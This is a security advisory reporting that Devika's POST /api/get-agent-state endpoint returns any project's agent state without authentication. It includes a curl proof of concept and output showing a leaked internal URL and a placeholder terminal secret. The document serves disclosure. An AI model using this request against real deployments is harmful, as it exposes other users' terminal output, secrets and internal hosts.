# Devika: unauthenticated cross-project agent-state read via POST /api/get-agent-state

## Description

`POST /api/get-agent-state` (devika.py:114-120) returns any project's agent-state stack verbatim by `project_name`, with no authentication and no ownership check. The state includes runtime-sensitive data such as browser_session screenshot paths/URLs and terminal_session commands and output.

## Impact

Any network client that can reach port 1337 reads other projects' agent state: internal URLs the victim project is browsing, terminal session output (which may contain secrets/internal information echoed by commands), internal monologue, etc.

## PoC

```bash
# Prerequisite: victim-project has agent state (browser_session.url points to an
#               internal host; terminal_session.output contains VICTIM-TERMINAL-SECRET-42)
curl -X POST http://127.0.0.1:1337/api/get-agent-state \
  -H "Content-Type: application/json" -d '{"project_name": "victim-project"}'
```

## Execution result

```
$ curl -X POST .../api/get-agent-state -d '{"project_name": "victim-project"}'
internal-victim-admin:8080/console
VICTIM-TERMINAL-SECRET-42
[HTTP 200]
```
